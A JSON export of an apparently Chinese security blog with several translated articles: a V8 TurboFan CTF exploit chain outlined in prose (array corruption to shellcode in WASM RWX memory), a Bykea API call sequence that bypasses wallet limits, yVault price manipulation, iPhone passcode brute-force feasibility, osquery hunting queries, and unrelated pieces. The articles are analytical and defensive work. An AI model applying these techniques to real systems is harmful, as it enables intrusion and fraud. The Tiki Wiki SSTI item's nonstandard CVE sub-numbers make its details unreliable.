[{"content":"引言\r很久以前我写过一篇关于内核池的博客文章，今年我们要在节点的海洋中畅游！当前趋势是攻击JavaScript引擎，特别是优化JIT编译器，如V8的TurboFan、SpiderMonkey的IonMonkey、JavaScriptCore的DFG \u0026amp; FTL或Chakra的SimpleJIT \u0026amp; FullJIT。\n本文将重点讨论TurboFan及其使用的\u0026quot;节点海洋\u0026quot;结构。然后，我们将研究Google CTF 2018中由@_tsuro编写的一个易受攻击的优化通道，并为其编写漏洞利用代码。我们将在x64 Linux机器上进行操作，但在Windows平台上的利用过程完全相同（只需使用不同的shellcode！）。\n环境搭建\r构建V8\r构建V8非常简单。您可以使用depot工具获取源代码，然后使用以下命令构建：\n1 2 3 4 fetch v8 gclient sync ./build/install-build-deps.sh tools/dev/gm.py x64.release 请注意，每当您更新源代码或检出特定提交时，请运行gclient sync，否则可能无法正确构建。\nd8 shell\r引擎提供了一个非常方便的shell称为d8。为了加快构建速度，可以将编译限制在此shell：\n1 ~/v8$ ./tools/dev/gm.py x64.release d8 尝试运行：\n1 2 3 4 ~/v8$ ./out/x64.release/d8 V8 version 7.3.0 (candidate) d8\u0026gt; print(\u0026#34;hello doare\u0026#34;) hello doare TurboFan编译管道\r让我们看以下代码：\n1 2 3 4 5 6 7 8 9 let f = (o) =\u0026gt; { var obj = [1,2,3]; var x = Math.ceil(Math.random()); return obj[o+x]; } for (let i = 0; i \u0026lt; 0x10000; ++i) { f(i); } 我们可以使用--trace-opt跟踪优化，并观察到函数f最终会被TurboFan优化。\n节点海洋\r简单介绍一下节点海洋。TurboFan使用称为\u0026quot;节点海洋\u0026quot;的程序表示。节点可以表示算术运算、加载、存储、调用、常量等。有三种类型的边：\n控制边：与控制流图中的边相同，用于分支和循环 值边：数据流图中的边，显示值依赖关系 效果边：对读取或写入状态等操作进行排序 实验优化阶段\r在本文中，我们想重点了解V8如何使用TurboFan生成优化代码。如前所述，TurboFan使用节点海洋，我们想了解这个图如何通过所有优化而演变。\n处理NumberAdd\r考虑以下函数：\n1 2 3 4 5 function opt_me() { let x = Math.random(); let y = x + 2; return y + 3; } 我们可以查看第一个生成的图，选择\u0026quot;bytecode graph builder\u0026quot;选项。JSCall节点对应于Math.random调用，NumberConstant和SpeculativeNumberAdd节点由x+2和y+3语句生成。\n类型阶段\r在图形创建之后是优化阶段，顾名思义，它运行各种优化过程。优化过程可以在多个阶段调用。其中一个早期优化阶段称为TyperPhase，由OptimizeGraph运行。\n当Typer运行时，它会访问图中的每个节点并尝试减少它们。例如，对于JSCall节点，它会调用JSCallTyper。如果被调用的函数是内置函数，它将为其关联一个类型。\n类型降低\r在OptimizeGraph中，类型降低紧随类型分析之后。这个阶段会经过更多的reducer。例如，TypedOptimization::Reduce会在访问节点时调用ReduceSpeculativeNumberAdd。\n边界检查节点\r我们的最终实验涉及CheckBounds节点。基本上，带有CheckBounds操作码的节点在加载和存储之前添加边界检查。\n考虑以下代码：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 function opt_me(b) { let values = [42,1337]; // HeapConstant \u0026lt;FixedArray[2]\u0026gt; let x = 10; // NumberConstant[10] | Range(10,10) if (b == \u0026#34;foo\u0026#34;) x = 5; // NumberConstant[5] | Range(5,5) // Phi | Range(5,10) let y = x + 2; // SpeculativeSafeIntegerAdd | Range(7,12) y = y + 1000; // SpeculativeSafeIntegerAdd | Range(1007,1012) y = y * 2; // SpeculativeNumberMultiply | Range(2014,2024) y = y \u0026amp; 10; // SpeculativeNumberBitwiseAnd | Range(0,10) y = y / 3; // SpeculativeNumberDivide | PlainNumber[r][s][t] y = y \u0026amp; 1; // SpeculativeNumberBitwiseAnd | Range(0,1) return values[y]; // CheckBounds | Range(0,1) } 为了防止values[y]使用越界索引，会生成一个CheckBounds节点。\nDuplicateAdditionReducer挑战\rStephen Röttger为Google CTF 2018编写的DuplicateAdditionReducer是一个很好的TurboFan挑战，它添加了一个新的reducer来优化类似x + 1 + 1的情况。\n理解漏洞\rV8使用IEEE-754双精度浮点数表示数字。这意味着它可以使用52位编码整数。因此最大值是pow(2,53)-1，即9007199254740991。大于此值的数字不能全部表示。因此，在计算大于该值的值时会出现精度损失。\n漏洞利用\r现在我们已经理解了漏洞，我们可能想要改进我们的原语。例如，获得读取和写入更多内存的能力会很有趣。\n完整的利用链包括以下步骤：\n破坏FixedDoubleArray 破坏JSArray并泄漏ArrayBuffer的后备存储 获取伪造对象 构建任意读/写原语 覆盖WASM RWX内存 最终，我们可以将shellcode写入RWX内存并执行它。\n结论\r本文详细分析了V8引擎中TurboFan优化编译器的一个漏洞，通过精度丢失问题实现越界读写，最终构建出完整的利用链实现任意代码执行。希望您喜欢这篇文章！\n","date":"2025-08-03T08:12:00+08:00","permalink":"http://localhost:1313/p/%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90v8%E5%BC%95%E6%93%8Eturbofan%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%8A%80%E6%9C%AF/","title":"深入解析V8引擎TurboFan的漏洞利用技术"},{"content":"作为AWS Hero，我获得了免费参加AWS re:Invent大会的机会。虽然我很少对多数演讲感兴趣——往年我参加过一些\u0026quot;高级\u0026quot;讲座，但内容都未超出已发布的文档范围——但我发现这是与亚马逊员工交流的绝佳机会。\n今年我有一长串诉求清单，考虑到可能引起亚马逊员工（甚至非亚马逊人士）的兴趣，我决定在此公开分享：\n增加re:Invent大会上的亚马逊开源开发者数量\n我期待周三与Valkey开发者会面，但对Firecracker开发者无人参会感到失望。亚马逊有不派工程师参会除非他们演讲的政策（我希望能改变这一政策），但对开源开发者而言，参会结识潜在贡献者至关重要。如果你的开源团队不参加会议，无论代码采用什么许可证，都不算真正在做开源。\n降低跨可用区(AZ)带宽定价\n我甚至不太在意成本本身，但人们对跨AZ带宽的担忧导致他们设计出糟糕的系统架构。亚马逊\u0026quot;良好架构框架\u0026quot;中的一条准则是将工作负载部署到多个位置，并明确指出使用单一可用区是个问题——但对跨AZ带宽的担忧（即使最终证明是多余的）阻碍了人们遵循这一准则。\n机架级EBS存储\n当前\u0026quot;SSD\u0026quot;EBS卷的I/O延迟表明它们与访问的EC2实例相距甚远。而某些EC2实例类型直接附加SSD，I/O性能显著提升——但耐久性低（实例终止数据即丢失）且缺乏弹性。将EBS存储部署在与EC2节点相同的机架上，可提供介于两者之间的解决方案，实现比跨数据中心更低的延迟，同时保持卷大小的灵活性。用户需接受\u0026quot;在此实例同机架创建卷\u0026quot;可能返回\u0026quot;该机架磁盘已满\u0026quot;的情况，但至少在实例启动时可以寻找有足够本地磁盘的机架。\n支持CHERI的安全实例\n这是我长期以来的愿望清单项目。CHERI在安全性方面具有巨大优势，哪家云厂商率先实现将遥遥领先竞争对手。我知道亚马逊（和其他云厂商）拥有用于研究的Morello开发板。\nMarketplace支持\u0026quot;待发布\u0026quot;版本\n当我在AWS Marketplace添加新的FreeBSD版本时，需经过审批流程并复制到所有EC2区域，然后Marketplace更新产品列表并发送新版本邮件通知。这常导致亚马逊发送新FreeBSD版本邮件比我官方发布公告还早几天。我希望能够预先告知Marketplace即将发布的FreeBSD版本，让他们准备就绪但暂不更新网站或发送邮件，直到我准备好官方公告（通常会给镜像和云服务几天同步时间）。\n此外，我还向Zoom提出改进建议：当从FreeBSD笔记本电脑加入会议时，Zoom网站应能通过用户代理字符串识别没有客户端，直接提供在浏览器中开会的选项，而不是反复尝试打开客户端。Zoom团队立即理解问题，甚至考虑将Linux客户端移植到FreeBSD。\n关于透明度说明：除了提供免费参会和差旅，亚马逊还赞助我的FreeBSD工作。他们资助的内容约一半是EC2相关，另一半是FreeBSD发布工程。没有他们的支持，许多重要功能将无法出现在FreeBSD 14.2-RELEASE中。感谢亚马逊。\n","date":"2025-08-03T08:00:39+08:00","permalink":"http://localhost:1313/p/%E6%88%91%E5%9C%A8reinvent%E5%A4%A7%E4%BC%9A%E4%B8%8A%E7%9A%84%E6%8A%80%E6%9C%AF%E8%AF%89%E6%B1%82%E4%BB%8E%E8%B7%A8az%E5%B8%A6%E5%AE%BD%E5%AE%9A%E4%BB%B7%E5%88%B0cheri%E5%AE%9E%E4%BE%8B/","title":"我在re:Invent大会上的技术诉求：从跨AZ带宽定价到CHERI实例"},{"content":"FBI的技术要求\r在枪击案调查中，FBI发现一部属于袭击者的iPhone 5C。该设备属于圣贝纳迪诺县公共卫生部（袭击者工作单位），FBI已获得搜查许可。但由于iOS设备的加密机制，FBI无法通过猜测密码解锁设备。在iOS设备中，几乎所有重要文件都采用设备密码和出厂时嵌入的硬件密钥组合加密。\niPhone密码猜测面临三大障碍：\n多次错误输入后iOS可能完全擦除用户数据 必须通过物理设备手动逐个输入PIN码 每次错误输入后iOS会引入延迟 为此，FBI通过法院命令向苹果提出三项技术协助要求：\n绕过或禁用自动擦除功能 允许通过物理端口/蓝牙/Wi-Fi等电子方式提交密码 消除密码尝试之间的人为延迟 简言之，FBI希望实现：无限次密码尝试、硬件允许的最快尝试速度、通过外部设备自动提交密码。\n技术实现方案\rFBI要求苹果提供特殊签名的iOS软件镜像(SIF)，该镜像将：\n仅在目标设备上运行 通过DFU模式加载到设备RAM 实现上述三项功能 在政府或苹果设施执行解锁操作 这相当于要求苹果开发一个定制版iOS（可戏称为FBiOS），该版本将：\n忽略密码输入延迟 不限制错误尝试次数 允许外接设备辅助密码猜测 安全飞地(Secure Enclave)的挑战\r配备A7及以上处理器的设备包含独立的安全飞地(SE)，它：\n管理数据保护API、Apple Pay等的加密密钥访问 采用类似核武器发射的双密钥系统（密码+硬件密钥） 自主维护错误尝试计数器并实施延迟（最长1小时） 完全独立于iOS操作系统 但涉案的iPhone 5C（A6处理器）没有安全飞地，其密码保护完全由iOS软件实现，因此单个固件更新即可绕过安全限制。\n技术可行性结论\r对于iPhone 5C：\n密码延迟和擦除功能由软件实现，可通过固件更新修改 苹果可添加对外设密码输入的支持 硬件密钥虽不可读取，但iOS可高速查询（每80ms一次尝试） 4位PIN码：约30分钟破解 6位PIN码：数小时 6位字母数字密码：数年 苹果可通过以下方式降低滥用风险：\n将定制固件锁定到特定设备 自行执行恢复操作而不向FBI提供固件 更新说明\r软件更新安全飞地不会擦除用户数据 苹果同样可通过软件更新绕过配备安全飞地设备的安全措施 自iOS 8起，大多数应用数据默认加密，必须猜测密码才能访问 ","date":"2025-08-03T07:49:35+08:00","permalink":"http://localhost:1313/p/%E8%8B%B9%E6%9E%9C%E6%8A%80%E6%9C%AF%E4%B8%8A%E6%9C%89%E8%83%BD%E5%8A%9B%E9%85%8D%E5%90%88fbi%E8%A7%A3%E9%94%81iphone-5c%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90ios%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/","title":"苹果技术上有能力配合FBI解锁iPhone 5C——深入解析iOS安全机制"},{"content":"漏洞技术细节\r安全研究员@bugbountywithmarco发现Bykea平台存在业务逻辑缺陷，允许钱包余额为负的青铜级合作伙伴绕过平台限制接受行程订单。通过串联调用三个后端API端点实现漏洞利用：\n初始请求\nGET /v2/:city_id/bookings 获取城市预订信息\n位置更新\nPUT /api/v2/driver/update/location 携带任意trip_id更新司机位置\n报价提交\nPOST /api/v2/offer/bid 提交行程报价\n通过这种调用链，负余额司机可重置其可用状态并成功提交报价，从而绕过钱包余额限制非法获取行程订单。\n时间线摘要\r2024-11-27 17:43 UTC 漏洞提交 2024-11-28 07:19 UTC 获得赏金 初始评级8.6（高危）后调整为6.5（中危） 2025-06-13 漏洞报告公开 技术影响\r该漏洞属于业务逻辑错误类别，暴露了三个关键问题：\n端点权限校验不完善 状态管理机制存在缺陷 负余额检测逻辑可被绕过 平台最终通过增强钱包状态校验机制修复该漏洞。\n","date":"2025-08-03T07:38:37+08:00","permalink":"http://localhost:1313/p/bykea%E6%BC%8F%E6%B4%9E%E6%8A%A5%E5%91%8A%E7%BB%95%E8%BF%87%E9%9D%92%E9%93%9C%E5%90%88%E4%BD%9C%E4%BC%99%E4%BC%B4%E9%92%B1%E5%8C%85%E9%99%90%E5%88%B6%E6%8E%A5%E5%8F%97%E8%B4%9F%E4%BD%99%E9%A2%9D%E8%A1%8C%E7%A8%8B%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/","title":"Bykea漏洞报告：绕过青铜合作伙伴钱包限制接受负余额行程的技术分析"},{"content":"意外踩到DeFi乐高积木 - Trail of Bits博客\ryVault的初始版本包含了一个可被攻击者操纵的yUSDC价格计算逻辑，可能导致资金池资产被耗尽。幸运的是，开发者Andre反应迅速，禁用了问题代码，保住了当时约40万美元的资金。这个漏洞凸显了DeFi领域因组合性带来的复杂性风险。\n什么是yVault？\r2020年7月25日，yEarn推出了名为yVault的新服务：用户可将代币存入金库，金库会将这些代币提供给能最大化利息的DeFi协议。初始版本支持USDC并与USDC/MUSD Balancer池集成。金库持有的任何USDC都将作为流动性提供给Balancer池，并获得BPT代币作为回报。\n用户存入USDC可获得yUSDC，反之销毁yUSDC可提取USDC。这两种操作依赖于动态计算的汇率，定义为合约持有的BPT价值与yUSDC总供应量的比率。由于交易者支付费用时BPT价值上升，每个yUSDC代币的价值会随时间缓慢增长。\nyVault发布一小时内，用户已存入约40万USDC，这促使我立即查看了其代码。\n漏洞是什么？\r由于初始版本与Balancer集成，我们需要了解Balancer的工作原理。Balancer通过激励理性市场参与者来消除流动性提供者手动重新平衡投资组合的需求。如果代币价格上涨，资金池将失去平衡。\n图1展示了基于Balancer池状态和发送代币数量计算接收代币数量的公式。我们以MUSD/USDC 50/50池为例，交换费率为0.05%。\n1 2 3 4 5 6 7 8 9 10 /********************************************************************************************** // calcOutGivenIn // // aO = tokenAmountOut // // bO = tokenBalanceOut // // bI = tokenBalanceIn / / bI \\ (wI / wO) \\ // // aI = tokenAmountIn aO = bO * | 1 - | -------------------------- | ^ | // // wI = tokenWeightIn \\ \\ ( bI + ( aI * ( 1 - sF )) / / // // wO = tokenWeightOut // // sF = swapFee // **********************************************************************************************/ 假设资金池当前失衡，包含1,100,000 USDC和900,000 MUSD。如果理性市场参与者支付90,000 MUSD，他们将获得99,954 USDC，盈利9,954 USDC。而当资金池平衡时(1,000,000 USDC和1,000,000 MUSD)，非理性市场参与者支付100,000 USDC将仅获得90,867 MUSD，亏损9,133 MUSD。\n将这两笔交易配对会产生有趣的现象。用户先进行\u0026quot;坏交易\u0026quot;(100,000 USDC→90,867 MUSD，亏损9,133 USD)，再进行\u0026quot;好交易\u0026quot;(90,867 MUSD→99,908 USDC，盈利9,041 USD)，净亏损仅92 USD。在此过程中，BPT估值会出现瞬间峰值，这正是漏洞的关键所在。\n将此过程应用于yVault：在\u0026quot;坏交易\u0026quot;前，金库持有价值X美元的BPT；\u0026ldquo;好交易\u0026quot;后，BPT价值略增至X+Δ。但在两笔交易之间，BPT价值会短暂激增。由于yUSDC价值与BPT直接相关，如果在\u0026quot;坏交易\u0026quot;前买入yUSDC并在\u0026quot;好交易\u0026quot;前卖出，就能瞬时获利。重复此操作可耗尽金库。\n如何修复？\r准确计算BPT真实价值并防止攻击者从滑点中获利是个难题。开发者Andre部署了新策略，简单地将USDC转换为MUSD并存入mStable储蓄账户。\n未来建议\rDeFi组合性很复杂，容易意外暴露新协议于风险中。集成多个代币时，任一代币都可能危及整个平台安全；集成多个平台时，协议可能遭受复杂交互影响。\n安全工具可帮助预防大多数简单代码漏洞：\nCrytic使用高级版Slither自动检测多达90种漏洞类型 Echidna通过模糊测试断言特定属性 Manticore可对代码进行符号分析 当然，工具不是安全的万能药。研究表明即使技术显著改进，近50%的问题仍难以通过工具检测。对于复杂代码库和DeFi项目，建议安排安全评估或参加我们的以太坊安全办公时间。\n","date":"2025-08-03T07:27:45+08:00","permalink":"http://localhost:1313/p/%E8%B8%A9%E5%88%B0defi%E4%B9%90%E9%AB%98%E7%A7%AF%E6%9C%A8yvault%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E4%BF%AE%E5%A4%8D/","title":"踩到DeFi乐高积木：yVault漏洞分析与修复"},{"content":"[CVE-2025-32461] Tiki Wiki CMS Groupware \u0026lt;=28.3版本的两个SSTI漏洞\n安全研究人员在Tiki Wiki CMS Groupware内容管理系统28.3及更早版本中发现了两处严重的服务器端模板注入(Server-Side Template Injection)漏洞。这些漏洞存在于系统的模板处理组件中，未经认证的攻击者可能通过精心构造的恶意输入实现远程代码执行。\n技术细节显示，第一个漏洞(CVE-2025-32461-1)影响Smarty模板引擎的特定过滤逻辑，而第二个漏洞(CVE-2025-32461-2)则涉及系统对用户提供数据的处理方式。当攻击者向特定端点提交特制payload时，系统会错误地将其解析为可执行代码。\n研究人员已在karmainsecurity.com发布完整的技术分析报告，包括：\n漏洞触发条件的具体调用栈分析 受影响版本的完整列表 概念验证(PoC)利用代码片段 临时缓解措施建议 目前Tiki Wiki开发团队尚未发布官方补丁。建议所有使用受影响版本的用户立即采取以下措施：\n禁用不必要的模板编辑功能 对用户输入实施更严格的过滤 监控服务器日志中的可疑模板解析行为 该漏洞的CVSSv3评分为9.8(严重级别)，特别需要注意的是，利用这些漏洞不需要任何先验认证。安全社区正在密切关注该漏洞的进一步发展和官方修复进度。\n","date":"2025-08-03T07:16:37+08:00","permalink":"http://localhost:1313/p/cve-2025-32461-tiki-wiki-cms-groupware-28.3%E7%89%88%E6%9C%AC%E5%AD%98%E5%9C%A8%E4%B8%A4%E4%B8%AAssti%E6%BC%8F%E6%B4%9E/","title":"[CVE-2025-32461] Tiki Wiki CMS Groupware \u003c=28.3版本存在两个SSTI漏洞"},{"content":"攻击面中每项资产的分类实践指南\rTLDR：本文详述了从业者可用于分类攻击面中每个Web应用和资产的方法与工具（从DNS记录、IP地址到HTTP分析和HTML内容）。您将学习从攻击者视角审视资产，不仅能识别资产存在，还能精确判断其性质。\n资产分类的必要性\r\u0026ldquo;无法保护未知存在的资产\u0026quot;是网络安全领域的常见箴言。但现实更为复杂：仅知道某物存在并不足够。要有效保护资产，必须了解每个资产的实质。没有正确分类，安全措施和工具的应用将变成猜谜游戏。\nDetectify研究表明，普通企业平均会漏测90%可能成为攻击目标的复杂Web应用。关键在于：攻击者只关心实际可访问的资产，而非您认为暴露的内容。\n外部视角的数据采集方法\r本指南假设采用由外至内的黑盒分析视角（非基于内部网络数据或源代码），按典型连接流顺序介绍分类方法：\n握手阶段分析\rDNS：\n托管位置 指针类型（A/CNAME/MX等记录） TXT记录信息（如SPF/DKIM/DMARC） IP：\n地理位置 自治系统号(ASN)归属 独立IP或地址段归属 端口：\n开放/关闭状态 防火墙行为特征（TCP/UDP处理差异） 协议：\n端口响应协议（HTTP/FTP/SSH等） 嵌套协议（如HTTP over TLS） SSL/TLS：\n证书颁发机构(CA) JARM指纹数据 主题备用名称(SANs) HTTP深度分析\r重点解析Web应用核心协议HTTP的关键数据点：\n响应代码：200 OK/30X重定向/50X服务器错误 响应头：X-自定义头/Cookie/安全头信息 文件签名：响应体前几字节的二进制特征 内容类型与长度：JSON/XML/HTML等格式识别 HTML层解析\r当响应为HTML时可获取更丰富信息：\nFavicon哈希：快速识别已知软件 URL模式：如/wp-admin/等特征路径 Meta标签：generator等属性暴露CMS信息 表单结构：登录表单字段揭示系统类型 代码特征：JS/HTML/CSS中的框架指纹 第三方资源：引用的外部脚本/API来源 工具与技术实现\rDNS分析\r小规模：dig命令+人工模式识别 大规模：MassDNS等开源工具 IP/端口扫描\r精准扫描：Nmap（支持服务检测） 大规模扫描：Zmap/MASSCAN（速度优先） ASN查询：Whois命令行/在线工具 协议识别\r标准工具：Nmap 高级指纹：JA4T（TLS指纹）/fingerprintx SSL/TLS解析\rJARM主动探测工具 证书透明度日志（如crt.sh） HTTP特征提取\r状态码分析： 30X重定向暴露服务器类型（如nginx） 40X/50X错误触发特定系统响应 响应头检测： Server/X-Powered-By等显性标记 CSP策略分析依赖资源（如Salesforce） 内容检测： file/xxd命令分析文件签名 Content-Type+Length组合识别应用类型 HTML指纹库\rFavicon哈希：Shodan等平台预置库 路径爆破：ffuf/dirsearch等工具配合字典 元标签抓取： 1 \u0026lt;meta name=\u0026#34;generator\u0026#34; content=\u0026#34;WordPress 6.2.2\u0026#34;\u0026gt; 代码语法树分析： Tree-sitter解析JavaScript AST ANTLR处理GraphQL等复杂语法 综合分类实践\r通过组合多维度数据点可回答关键安全问题：\nDNS端点是否过时？ 是否遵守内部证书颁发策略？ 重定向配置是否正确？ CMDB是否与实际暴露面一致？ 系统化的资产分类使安全团队超越简单发现，实现深度理解和测试。部分工具可自动化分类过程，并智能推荐需重点测试的高风险资产。\n","date":"2025-08-03T07:05:54+08:00","permalink":"http://localhost:1313/p/%E6%94%BB%E5%87%BB%E9%9D%A2%E8%B5%84%E4%BA%A7%E5%88%86%E7%B1%BB%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97%E4%BB%8Edns%E8%AE%B0%E5%BD%95%E5%88%B0html%E5%88%86%E6%9E%90%E7%9A%84%E5%85%A8%E9%9D%A2%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/","title":"攻击面资产分类实践指南：从DNS记录到HTML分析的全面技术解析"},{"content":"使用osquery追踪被盗代码签名证书\r近期，270万台Windows计算机因运行了通过CCleaner软件更新机制分发的恶意软件而感染，该恶意软件使用了从CCleaner开发者处窃取的代码签名证书进行签名。幸运的是，得益于同事Alessandro Gario提交的拉取请求（为osquery新增了Windows可执行文件代码签名验证功能，即Authenticode），检测此类签名恶意软件现已变得简单。本文将探讨代码签名在事件响应中的重要性，并通过实际案例演示这一新功能的用途。\n代码签名恶意软件的威胁\r代码签名本应防止可执行文件被恶意篡改，并允许用户（或平台所有者）选择是否运行来自非信任源的代码。然而，在Windows等通用计算平台上，第三方软件供应商需自行保护其代码签名证书。攻击者意识到，只需窃取其中一个证书即可为恶意软件签名，使其看似来自合法供应商。这种现象（以及著名的Stuxnet事件）催生了使用被盗证书签名恶意软件的趋势，并成为近年来犯罪和国家级攻击的常规手段，最近的案例便是CCleaner的受感染更新。\n防御者已意识到，依赖“所有第三方供应商都能保护其签名证书”的信任模型并不可靠。在Windows等平台上，代码签名仅能作为薄弱的信任标记或应用白名单机制。但代码签名还有另一用途：事件响应。一旦确认某签名证书被盗，它即可作为明确的入侵指标（IoC）。防御者可借此搜索网络中其他使用该证书签名的可执行文件——即使恶意软件绕过了杀毒软件，被盗证书的签名检查也能以0误报率精准定位威胁。osquery正是执行此类搜索的理想工具。\n通过osquery验证Authenticode签名\rosquery通过“表”的形式新增传感器功能，将系统信息抽象为SQL表。添加新表需先定义其规范（schema），包括列名、数据类型及简短描述。Alessandro的拉取请求为Windows新增了authenticode虚拟表，包含以下列：\npath：文件路径\noriginal_program_name：发布者名称\nserial_number：证书序列号\nsubject_name：主题名称\nresult：验证结果\n签名验证通过系统API WinVerifyTrust()实现，代码位于osquery/tables/system/windows/authenticode.cpp。以下为检查Windows可执行文件签名的简化示例：\n1 2 3 ...\u0026gt; FROM authenticode ...\u0026gt; WHERE path = \u0026#39;C:\\Windows\\explorer.exe\u0026#39;; result列的可能值及含义：\n状态 说明 missing 文件无签名。 invalid 签名无效（文件缺失或损坏）。 untrusted 签名无法通过验证。 distrusted 有效签名，但被用户显式标记为不信任。 valid 有效签名，但未被用户显式信任。 trusted 有效签名且受用户信任。 使用SQL优化osquery查询结果\r通过与其他系统表联查（JOIN），可显著提升监控效率。例如，以下查询列出所有未签名进程，减少无关噪音：\n1 2 3 4 5 osquery\u0026gt; SELECT process.pid, process.path, authenticode.result ...\u0026gt; FROM processes as process ...\u0026gt; LEFT JOIN authenticode ...\u0026gt; ON process.path = authenticode.path ...\u0026gt; WHERE result = \u0026#39;missing\u0026#39;; 追踪被盗签名证书\r假设某恶意活动使用从合法供应商（如CCleaner）窃取的证书签名。供应商已更换新证书并重新分发应用。如何排查设备中仍使用旧证书签名的文件？\n示例1：查找使用被盗证书签名的文件\n1 2 3 4 5 6 7 8 9 10 osquery\u0026gt; SELECT files.path, authenticode.subject_name, ...\u0026gt; authenticode.serial_number, ...\u0026gt; authenticode.result AS status ...\u0026gt; FROM ( ...\u0026gt; SELECT * FROM file ...\u0026gt; WHERE directory = \u0026#34;C:\\Program Files\\CCleaner\u0026#34; ...\u0026gt; ) AS files ...\u0026gt; LEFT JOIN authenticode ...\u0026gt; ON authenticode.path = files.path ...\u0026gt; WHERE authenticode.serial_number == \u0026#34;4b48b27c8224fe37b17a6a2ed7a81c9f\u0026#34;; 示例2：查找由该供应商签名但未使用新证书的文件\n1 2 3 4 5 6 7 8 9 10 11 osquery\u0026gt; SELECT files.path, authenticode.subject_name, ...\u0026gt; authenticode.serial_number, ...\u0026gt; authenticode.result AS status ...\u0026gt; FROM ( ...\u0026gt; SELECT * FROM file ...\u0026gt; WHERE directory = \u0026#34;C:\\Program Files\\CCleaner\u0026#34; ...\u0026gt; ) AS files ...\u0026gt; LEFT JOIN authenticode ...\u0026gt; ON authenticode.path = files.path ...\u0026gt; WHERE authenticode.subject_name LIKE \u0026#34;%Piriform%\u0026#34; ...\u0026gt; AND authenticode.serial_number != \u0026#34;52b6a81474e8048920f1909e454d7fc0\u0026#34;; 示例3：结合代码签名与文件哈希记录\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 SELECT files.path AS path, ...\u0026gt; authenticode.subject_name AS subject_name, ...\u0026gt; authenticode.serial_number AS serial_number, ...\u0026gt; authenticode.result AS status, ...\u0026gt; hashes.sha256 AS sha256 ...\u0026gt; FROM ( ...\u0026gt; SELECT * FROM file ...\u0026gt; WHERE directory = \u0026#34;C:\\Program Files\\CCleaner\u0026#34; ...\u0026gt; ) AS files ...\u0026gt; LEFT JOIN authenticode ...\u0026gt; ON authenticode.path = files.path ...\u0026gt; LEFT JOIN hash AS hashes ...\u0026gt; ON hashes.path = files.path ...\u0026gt; WHERE authenticode.subject_name LIKE \u0026#34;%Piriform%\u0026#34; ...\u0026gt; AND authenticode.serial_number != \u0026#34;52b6a81474e8048920f1909e454d7fc0\u0026#34;; 未来展望\r本文展示了osquery作为系统信息检索工具的灵活性：通过熟悉的SQL语法，可快速定制查询以获取目标信息。Authenticode签名检查仅是osquery作为事件响应工具的用途之一。许多IT和安全团队正利用osquery进行实时响应，包括初始恶意软件检测和传播分析。\nTrail of Bits很早就认识到osquery的潜力。过去一年中，我们根据客户需求持续添加功能。如果您正在使用或考虑使用osquery，并需要特定功能，请联系我们！我们愿助您定制osquery以满足需求。\n","date":"2025-08-03T06:54:27+08:00","permalink":"http://localhost:1313/p/%E4%BD%BF%E7%94%A8osquery%E8%BF%BD%E8%B8%AA%E8%A2%AB%E7%9B%97%E4%BB%A3%E7%A0%81%E7%AD%BE%E5%90%8D%E8%AF%81%E4%B9%A6%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/","title":"使用osquery追踪被盗代码签名证书的技术解析"},{"content":"企业全员开发化时代来临\rChatGPT带来的问题将愈演愈烈。任何员工都能轻松复制Python代码调用API，而GPTs、微软Copilot Studio等工具的涌现将进一步降低技术门槛。这些工具的核心价值在于让非技术人员通过自然语言编程并部署应用，但随之而来的是严重的安全隐患：缺乏开发经验的员工可能无意中暴露数据、违反合规要求，而安全团队甚至无从知晓这些\u0026quot;影子应用\u0026quot;的存在。传统开发安全流程已无法应对这种分布式开发浪潮。\n生成式AI落地困境持续\rO\u0026rsquo;Reilly最新报告显示，企业采用生成式AI的最大障碍是缺乏合适的商业场景。即使找到应用场景，从测试到生产环境的过程充满变数——小规模测试成功的技术，往往在真实复杂环境中暴露出致命缺陷。全球顶尖企业尚且难以实现技术落地，这个趋势将在2024年持续。\n深度AI集成的安全隐私危机\r当AI深度嵌入系统时，我们将进入文件访问无记录、数据传输无预警、代码变更无痕迹的\u0026quot;安全黑洞\u0026quot;。这些实验性技术尚未完全暴露所有缺陷，却已被快速部署到核心系统。攻击面因此扩大：原本稳健的应用程序可能被新型攻击手段操控。隐私方面，大语言模型(LLM)需要明文交互进行质量评估的特性，使得敏感数据暴露风险剧增。不同产品线的隐私保护差异更需警惕。\nGPT-5技术突破有限\r尽管舆论热炒GPT-5将接近通用人工智能(AGI)，但现实可能令人失望。当前LLM技术已触及天花板，仅靠规模扩大收效甚微。各厂商发布的模型在本质上差异不大，某些任务表现提升也仅限于特定领域。除非出现革命性创新，否则2024年我们仍将处于技术平台期。\nAI环境成本浮出水面\r生成式AI的\u0026quot;肮脏小秘密\u0026quot;是其惊人的环境代价：每处理50次查询就消耗500毫升水（相当于1瓶矿泉水）。最新研究《Power Hungry Processing》揭示：生成任务比判别任务耗能更高，图像处理比文本处理碳足迹更大，训练过程比推理过程能耗高出数量级。当科技巨头停止补贴，真实运营成本将颠覆当前商业模式。\n回归技术实用主义\r技术不需要改变世界才能创造价值。就像驾驶辅助系统虽未实现完全自动驾驶，却已显著提升行车安全。2024年将是AI去泡沫化的开始——投资者将提出更尖锐的问题，企业会更务实评估技术投入。但真正的创新永远值得期待，关键在于建立审慎的技术评估和部署机制。\n","date":"2025-08-03T06:42:58+08:00","permalink":"http://localhost:1313/p/2024%E5%B9%B4ai%E9%A2%84%E6%B5%8B%E4%B8%8E%E6%80%9D%E8%80%83%E6%8A%80%E6%9C%AF%E8%B6%8B%E5%8A%BF%E4%B8%8E%E5%AE%89%E5%85%A8%E9%9A%90%E5%BF%A7/","title":"2024年AI预测与思考：技术趋势与安全隐忧"},{"content":"编程理想显示器配置方案（已解决！）\r最优屏幕配置的承诺在于：如果能同时显示编程项目的所有相关部分，就能节省切换工作区域所需的时间和脑力——从而成为效率更高的程序员。但：\n如果屏幕过大导致查看边缘区域时需要扭动脖子——这是负面影响 使用曲面超宽屏获取更多空间——也可能带来弊端 